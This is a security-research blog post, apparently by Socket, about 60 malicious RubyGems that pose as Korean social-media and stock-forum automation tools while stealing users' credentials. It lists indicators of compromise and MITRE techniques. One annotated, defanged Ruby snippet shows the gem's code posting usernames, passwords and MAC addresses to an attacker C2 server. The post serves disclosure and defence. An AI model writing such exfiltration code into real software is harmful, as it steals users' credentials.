---
title: "60 Malicious Ruby Gems Used in Targeted Credential Theft Campaign"
date: 2025-08-07 12:00:00 +0000
categories: [RubyGems]
tags: [RubyGems, Infostealer, South Korea, Spam, Grey-Hat, Stock Manipulation, T1195.002, T1608.001, T1204.002, T1056.002, T1016, T1041]
canonical_url: https://socket.dev/blog/60-malicious-ruby-gems-used-in-targeted-credential-theft-campaign
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/86b95cad5f9b483f702c5406dc9d819a860e61e7-1024x1024.png
  alt: "60 Malicious Ruby Gems Used in Targeted Credential Theft Campaign"
description: "A RubyGems malware campaign used 60 malicious packages posing as automation tools to steal credentials from social media and marketing tool users."
---

> *Update: A follow-up on this research was published on August 22, 2025, to clarify details of the RubyGems.org security team's role in the removal of the malicious gems: [Follow-up and Clarification on Recent Malicious Ruby Gems Campaign](https://socket.dev/blog/follow-up-on-malicious-ruby-gems-campaign)*

Socket's Threat Research Team has uncovered a long-running supply chain attack in the RubyGems ecosystem. Since at least March 2023, a threat actor using the aliases `zon`, `nowon`, `kwonsoonje`, and `soonje` has published 60 malicious gems posing as automation tools for Instagram, Twitter/X, TikTok, WordPress, Telegram, Kakao, and Naver. These gems deliver their advertised functionality, such as bulk posting or engagement, but covertly exfiltrate credentials (usernames and passwords) to threat actor-controlled infrastructure, which classifies them as infostealer malware.

The campaign evolved across multiple aliases and infrastructure waves, suggesting a mature and persistent operation. Many victims are grey-hat marketers who rely on disposable identities and automation tools to run spam, search engine optimization (SEO), and synthetic engagement campaigns. Their reliance on throwaway social media accounts enabled the malware to operate in plain sight for over a year without public detection.

16 malicious gems published under the `nowon`, `kwonsoonje`, and `soonje` accounts remain live on RubyGems at the time of writing. An additional 44 gems published under the `zon` account were later removed (yanked) by the threat actor, but remain accessible through cached mirrors and existing installations. Each gem functions as a Windows-targeting infostealer, primarily (but not exclusively) aimed at South Korean users, as evidenced by Korean-language UIs and exfiltration to `.kr` domains.

Collectively, the gems have been downloaded over 275,000 times. However, this figure does not reflect the number of compromised systems, as not every download results in execution, and some systems may have installed multiple gems from the same malicious cluster. We have reported the threat actor to the RubyGems security team and requested the removal of all active gems and suspension of the associated accounts.

## Credential Theft Inside Malicious Gems

The malicious gems published by the threat actor exhibit consistent credential theft behavior across a continuously evolving campaign. Each gem includes a lightweight graphical interface [written](https://socket.dev/rubygems/package/iuz-64bit/files/0.0.7/lib/iuz-64bit.rb?platform=ruby#L766) in Korean using [Glimmer-DSL-LibUI](https://socket.dev/rubygems/package/iuz-64bit/files/0.0.7/lib/iuz-64bit.rb?platform=ruby#L1645), prompting the operator to enter credentials for social media, blogging, or messaging platforms. Instead of storing the input locally or using it for legitimate API authentication, the credentials are immediately exfiltrated via `HTTP POST` requests to threat actor-controlled servers, including `programzon[.]com`, `appspace[.]kr`, and `marketingduo[.]co[.]kr`. These domains host PHP bulletin board endpoints (e.g., `/auth/program/signin`, `/bbs/login_check.php`) that function as rudimentary credential collection panels.

![Socket AI Scanner analysis of iuz-64bit](https://cdn.sanity.io/images/cgdhsj6q/production/d146999dd813291f38a4f15525970992ee44a380-709x750.png)
_Socket AI Scanner's analysis of the malicious [`iuz-64bit`](https://socket.dev/rubygems/package/iuz-64bit) gem confirms its infostealer functionality._

The annotated and defanged [code](https://socket.dev/rubygems/package/iuz-64bit/files/0.0.7/lib/iuz-64bit.rb?platform=ruby#L766) from [`iuz-64bit`](https://socket.dev/rubygems/package/iuz-64bit) below shows how the gem exfiltrates user credentials and host information to a command and control (C2) server:

```ruby
def login_check2(user_id, user_pw)
  url     = 'https://programzon[.]com/auth/program/signin' # C2 endpoint
  headers = { 'Content-Type' => 'application/json' }       # Set content type
  mac     = get_mac_address                                # Retrieve MAC address
  body    = {
    username:   user_id,                                   # Instagram username
    password:   user_pw,                                   # Instagram password
    macAddress: mac,                                       # Host MAC address
    program:    '인스타 자동 포스팅(업로드) 프로그램'  # "Instagram auto posting program"
  }.to_json

  response = HTTP.post(url, headers: headers, body: body)  # Exfiltrate data
  payload  = JSON.parse(response.body.to_s)                # Parse C2 response
  return payload['status'] == "0" ? "0" : payload['message']
end
```

All other malicious gems in the campaign exhibit near-identical credential theft behavior, regardless of the platform they advertise to support. In addition to the Instagram gem described above, the campaign includes tools targeting [TikTok](https://socket.dev/rubygems/package/tiupd), [Twitter/X](https://socket.dev/rubygems/package/t64d), [Telegram](https://socket.dev/rubygems/package/tg_send_zon), [WordPress](https://socket.dev/rubygems/package/wp_posting_duo), [Naver](https://socket.dev/rubygems/package/nblog_duo), [Tistory](https://socket.dev/rubygems/package/tblog_duopack), and other platforms. In each case, user credentials and MAC addresses are silently sent to one of several threat actor-controlled servers. The use of MAC addresses suggests that the threat actor is correlating infections across campaigns or installations, enabling long-term victim fingerprinting.

## Timeline and Evolution

The credential theft functionality has persisted throughout the RubyGems malware campaign, which has been active since at least March 2023. Across four RubyGems aliases, the threat actor published 60 malicious gems in coordinated waves. Each wave introduced support for a new platform, beginning with [TikTok](https://socket.dev/rubygems/package/tiupd) and gradually expanding to more complex automation targeting [Instagram](https://socket.dev/rubygems/package/idd-64bit), [Twitter/X](https://socket.dev/rubygems/package/t64z), [Telegram](https://socket.dev/rubygems/package/tg_send_zon), [Naver](https://socket.dev/rubygems/package/cafe_basics_duo), [WordPress](https://socket.dev/rubygems/package/backlink_zon), and other ecosystems. The campaign follows a regular cadence, with approximately one new cluster published every two to three months.

Throughout the campaign, the threat actor added new C2 endpoints without retiring the old ones, likely to maintain redundancy and to track the performance or distribution of different malicious gem clusters. Despite changes in infrastructure, the credential theft code remains consistent across all malicious gems.

Gems published under the threat actor's `zon` alias are often yanked within a short time frame, potentially as part of an operational cycle involving repackaging and redeployment under new names. The `zon` account remains active after each wave of yanked packages and continues to publish new malicious gems. While yanking removes these packages from the RubyGems public index, it does not delete archived versions already mirrored in CI caches or present on infected systems. This approach allows the threat actor to persistently distribute credential-stealing malware while discarding visible indicators tied to earlier uploads, effectively fragmenting attribution and evading detection based on gem metadata.

Artifacts from the malicious gems map directly to the previously mentioned C2 endpoints and to tools promoted on `programzon[.]com`, `appspace[.]kr`, `marketingduo[.]co[.]kr`, and `seven1.iwinv[.]net` — grey-hat marketing sites that advertise automation products using the same names and descriptions found in the malicious gems.

![marketingduo screenshot](https://cdn.sanity.io/images/cgdhsj6q/production/37fa431f0d648178acdf6414d8994f974bf3f067-1238x1019.png)
_Screenshot from `marketingduo[.]co[.]kr`, a Korean-language platform offering bulk messaging, phone number scraping, and automated social media tools. The site promotes Instagram, Telegram, and blogging automation products, targeting grey-hat marketers seeking mass engagement and large-scale posting capabilities. Identical interfaces are also hosted on related domains operated by the threat actor, including `programzon[.]com`, `appspace[.]kr`, and `seven1.iwinv[.]net`._

## Targeting South Korean Users

The RubyGems credential-stealing campaign appears explicitly tailored to South Korean users. All graphical user interfaces, help text, logging messages, and internal variable names are written in Korean, including common prompts like "아이디" (ID) and "비밀번호" (password). The phrasing and terminology in the source code reflect conventions typical of Korean software development, suggesting the code was written by a fluent speaker for a domestic audience. Combined with region-specific infrastructure and Korean-language UI elements, these indicators point to a likely focus on the Korean market. However, the lack of geofencing leaves the payloads globally exploitable.

## Grey-Hat Marketers Are Among the Victims

Infostealer logs from compromised systems tied to registered users of `marketingduo[.]co[.]kr` reveal a distinct victim demographic: grey-hat marketers. These operators rely on aggressive automation strategies across social media, blogging, SEO, and messaging platforms. Their toolkits include mass-posting bots, fake account marketplaces, and search engine manipulation services — making them ideal targets for the RubyGems malware cluster.

Logs advertised and sold on dark web marketplaces such as Russian Market show that infected systems interacted with `marketingduo[.]co[.]kr` while logged in, confirming the victims were active customers of the service.

![Russian Market infostealer logs](https://cdn.sanity.io/images/cgdhsj6q/production/c2816c13edfea389c801f93a7a95dc92faf2e9f1-935x508.png)
_Screenshot from the Russian Market dark web shop showing infostealer logs from compromised systems in South Korea. Multiple logs contain evidence of victims accessing `marketingduo[.]co[.]kr` as logged-in users, indicating they are registered customers of the service. These systems also show activity on platforms used to acquire fake accounts, followers, views, and related spam infrastructure._

The same systems also accessed tools commonly used to scale synthetic engagement and evade detection:

- **SMM panels** such as `smmdoge[.]com`, `ytmonster[.]net`, and `bulkfollows[.]com`, which sell fake followers, views, and aged social media accounts.
- **Backlink and SEO platforms** like `BacklinkMachine`, `SpamZilla`, `hypersuggest[.]com`, and `serpnames[.]com`, used for automated link building and keyword scraping. A "backlink" refers to a hyperlink on one website that points to another website, in this context used to manipulate search engine rankings.
- **Account marketplaces** such as `accs-market[.]com`, which trade in pre-hijacked or synthetic accounts.
- **Disposable SMS gateways** like `smshub[.]org`, which provide OTP-bypass infrastructure for mass registration.
- **Automation and proxy tooling** from `bablosoft[.]com` and `proxylink[.]pro`, which support browser scripting, scraping, and proxy rotation at scale.

![smmdoge SMM panel](https://cdn.sanity.io/images/cgdhsj6q/production/05ec011e33e9b4bf9e302aa3981ea8ac50a3fe91-1338x956.png)
_Screenshot from `smmdoge[.]com`, an SMM panel offering bulk account and engagement services across Instagram, TikTok, YouTube, and more. Listings include aged and farmed accounts with posts, 2FA credentials, cookies, and follower counts ranging from 10 to 50,000+. These offerings enable mass automation, spam, fake engagements, and synthetic identity operations._

The malware campaign is engineered to exploit this environment. Grey-hat operators frequently rely on disposable accounts and automation tools. When credentials are compromised, they rarely report the breach; they simply abandon the account and create a new one. This disposability, combined with their appetite for low-effort automation, has allowed the malicious RubyGems packages to persist undetected, stealing credentials at scale.

The threat actor targeting this demographic directly through ads on Korean-language Telegram and Kakao channels, promoting tools with advertising "자동 백링크 프로그램" (auto-backlink program) and "무료 상위노출 툴" (free top-ranking tool).

By embedding credential theft functionality within gems marketed to automation-focused grey-hat users, the threat actor covertly captures sensitive data while blending into activity that appears legitimate. Many of the services used by these victims, such as SMM panels, proxy gateways, and backlink spam tools, are also commonly employed in coordinated inauthentic behavior and influence operations. As a result, the campaign's access and infrastructure may be leveraged beyond commercial abuse and used in more strategic contexts, including disinformation and financial manipulation.

## Financial Forum Manipulation

Among the malicious gems in this campaign, several stand out for their explicit focus on financial discussion platforms. Gems such as [`njongto_duo`](https://socket.dev/rubygems/package/njongto_duo) and [`jongmogtolon`](https://socket.dev/rubygems/package/jongmogtolon) are marketed as autoposters for stock discussion rooms — popular venues for real-time equity speculation. These gems are designed for grey-hat promoters looking to flood forums with ticker mentions, stock narratives, and synthetic engagement to amplify visibility and manipulate perception. The same gems that promise bulk engagement simultaneously harvest sensitive user credentials.

This behavior fits a dual-use model. The gems empower grey-hat marketers to execute financial influence campaigns, while also providing the threat actor with persistent access to their accounts. Given the high concentration of disposable or farmed accounts in this space, victims may not detect the compromise at all. The result is a stealthy, self-sustaining campaign that exploits both the operators and their infrastructure.

![Socket AI Scanner analysis of njongto_duo](https://cdn.sanity.io/images/cgdhsj6q/production/ae12c1d66742994db5b44ef4afdeeddc2784ff8f-707x772.png)
_Socket AI Scanner's analysis of the malicious [`njongto_duo`](https://socket.dev/rubygems/package/njongto_duo) RubyGem reveals its dual function as both a stock forum autoposter and an infostealer. While it advertises bulk-posting automation for stock discussion boards, the gem covertly exfiltrates plaintext credentials and MAC addresses to a C2 endpoint (`appspace[.]kr/bbs/login_check.php`) controlled by the threat actor._

## Outlook and Recommendations

Supply chain attacks like the RubyGems credential harvester campaign highlight the risk of malicious packages that specifically target niche operator communities while covertly exfiltrating sensitive data. These threats are designed to persist undetected within automation environments, where disposable infrastructure and synthetic identities mask the impact of compromise.

The threat actor's ability to cycle infrastructure and rebrand packages to evade detection suggests an evolving, adaptive campaign that is likely to continue. Looking ahead, defenders should anticipate the reuse of this model across other ecosystems beyond RubyGems.

Socket's security tooling is purpose-built to counter this threat landscape. The [Socket GitHub App](https://socket.dev/features/github) enables real-time scanning of pull requests, blocking suspicious or malicious packages before they enter your codebase. The [Socket CLI](https://socket.dev/features/cli) tool alerts to red flags at install time, providing critical context and warnings before malicious dependencies are added. For developers browsing open source ecosystems, the [Socket browser extension](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1) alerts users when viewing or attempting to install high-risk packages. And to address supply chain risks introduced by AI coding assistants, [Socket MCP](https://socket.dev/blog/socket-mcp) extends this protection to LLM-driven development environments, flagging hallucinated or unsafe packages before they are introduced through autocomplete or suggestions.

Integrating these tools into your development workflows ensures continuous monitoring and early detection of malicious packages — before they reach production environments or end users. As threat actors expand their focus to include more ecosystems and target automation-heavy operator communities, defenders must adopt proactive, intelligence-driven measures to protect their software supply chains.

## Indicators of Compromise (IOCs)

### Malicious Gems — `zon` Alias

1. [`back_duo`](https://socket.dev/rubygems/package/back_duo)
1. [`backlink_zon`](https://socket.dev/rubygems/package/backlink_zon)
1. [`cafe_basics`](https://socket.dev/rubygems/package/cafe_basics)
1. [`cafe_basics_duo`](https://socket.dev/rubygems/package/cafe_basics_duo)
1. [`cafe_bey`](https://socket.dev/rubygems/package/cafe_bey)
1. [`cafe_buy`](https://socket.dev/rubygems/package/cafe_buy)
1. [`cafe_buy_duo`](https://socket.dev/rubygems/package/cafe_buy_duo)
1. [`dpregister`](https://socket.dev/rubygems/package/dpregister)
1. [`duo_board_crawling`](https://socket.dev/rubygems/package/duo_board_crawling)
1. [`duo_blog_cafe_comment`](https://socket.dev/rubygems/package/duo_blog_cafe_comment)
1. [`duo_blog_comment`](https://socket.dev/rubygems/package/duo_blog_comment)
1. [`duo_cafe_comment`](https://socket.dev/rubygems/package/duo_cafe_comment)
1. [`idd-64bit`](https://socket.dev/rubygems/package/idd-64bit)
1. [`idz-64bit`](https://socket.dev/rubygems/package/idz-64bit)
1. [`iuu-64bit`](https://socket.dev/rubygems/package/iuu-64bit)
1. [`iuz-64bit`](https://socket.dev/rubygems/package/iuz-64bit)
1. [`njongto_duo`](https://socket.dev/rubygems/package/njongto_duo)
1. [`njongto_zon`](https://socket.dev/rubygems/package/njongto_zon)
1. [`nblog_duo`](https://socket.dev/rubygems/package/nblog_duo)
1. [`nblog_zon`](https://socket.dev/rubygems/package/nblog_zon)
1. [`posting_duo`](https://socket.dev/rubygems/package/posting_duo)
1. [`posting_zon`](https://socket.dev/rubygems/package/posting_zon)
1. [`podu332ss`](https://socket.dev/rubygems/package/podu332ss)
1. [`podu33332ss`](https://socket.dev/rubygems/package/podu33332ss)
1. [`t32d`](https://socket.dev/rubygems/package/t32d)
1. [`t64d`](https://socket.dev/rubygems/package/t64d)
1. [`t64z`](https://socket.dev/rubygems/package/t64z)
1. [`tblog_duopack`](https://socket.dev/rubygems/package/tblog_duopack)
1. [`tblog_zon`](https://socket.dev/rubygems/package/tblog_zon)
1. [`tg_send_duo`](https://socket.dev/rubygems/package/tg_send_duo)
1. [`tg_send_zon`](https://socket.dev/rubygems/package/tg_send_zon)
1. [`tiupd`](https://socket.dev/rubygems/package/tiupd)
1. [`tiupz`](https://socket.dev/rubygems/package/tiupz)
1. [`tidpd`](https://socket.dev/rubygems/package/tidpd)
1. [`tidpz`](https://socket.dev/rubygems/package/tidpz)
1. [`tizdppd`](https://socket.dev/rubygems/package/tizdppd)
1. [`tizdppz`](https://socket.dev/rubygems/package/tizdppz)
1. [`wp_posting_duo`](https://socket.dev/rubygems/package/wp_posting_duo)
1. [`wp_posting_zon`](https://socket.dev/rubygems/package/wp_posting_zon)
1. [`zon_board_crawling`](https://socket.dev/rubygems/package/zon_board_crawling)
1. [`zon_blog_cafe_comment`](https://socket.dev/rubygems/package/zon_blog_cafe_comment)
1. [`zon_blog_comment`](https://socket.dev/rubygems/package/zon_blog_comment)
1. [`zon_cafe_comment`](https://socket.dev/rubygems/package/zon_cafe_comment)
1. [`zpregister`](https://socket.dev/rubygems/package/zpregister)

### Malicious Gems — `nowon` Alias

1. [`soonje_1`](https://socket.dev/rubygems/package/soonje_1)
1. [`soonje_2`](https://socket.dev/rubygems/package/soonje_2)
1. [`soonje_2_2`](https://socket.dev/rubygems/package/soonje_2_2)
1. [`soonje_3`](https://socket.dev/rubygems/package/soonje_3)
1. [`setago3`](https://socket.dev/rubygems/package/setago3)
1. [`deltago4`](https://socket.dev/rubygems/package/deltago4)
1. [`board_posting_duo`](https://socket.dev/rubygems/package/board_posting_duo)
1. [`tblog_duo`](https://socket.dev/rubygems/package/tblog_duo)
1. [`CAFE_Product`](https://socket.dev/rubygems/package/CAFE_Product)
1. [`CAFE_General`](https://socket.dev/rubygems/package/CAFE_General)
1. [`CAFE_verillban`](https://socket.dev/rubygems/package/CAFE_verillban)
1. [`jongmogtolon`](https://socket.dev/rubygems/package/jongmogtolon)

### Malicious Gems — `kwonsoonje` Alias

1. [`setago`](https://socket.dev/rubygems/package/setago)
1. [`setago2`](https://socket.dev/rubygems/package/setago2)
1. [`deltago`](https://socket.dev/rubygems/package/deltago)

### Malicious Gems — `soonje` Alias

1. [`deltago3`](https://socket.dev/rubygems/package/deltago3/overview/0.2.4?platform=ruby)

### C2 Endpoints and Network Indicators

- `programzon[.]com/auth/program/signin`
- `programzon[.]com`
- `appspace[.]kr/bbs/login_check.php`
- `appspace[.]kr`
- `marketingduo[.]co[.]kr/bbs/login_check.php`
- `marketingduo[.]co[.]kr`
- `seven1.iwinv[.]net`
- `duopro[.]co[.]kr`

### Email Addresses Extracted from Gems

- `mymin26@naver[.]com`
- `rnjstnswp123@naver[.]com`
- `marketingduo@marketingduo[.]com`

### Telegram

- `@duo3333`

### Kakao OpenChat Room

- `https://open[.]kakao[.]com/o/sCxh7vCd`

## MITRE ATT&CK Techniques

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1608.001 — Stage Capabilities: Upload Malware
- T1204.002 — User Execution: Malicious File
- T1056.002 — Input Capture: GUI Input Capture
- T1016 — System Network Configuration Discovery
- T1041 — Exfiltration Over C2 Channel
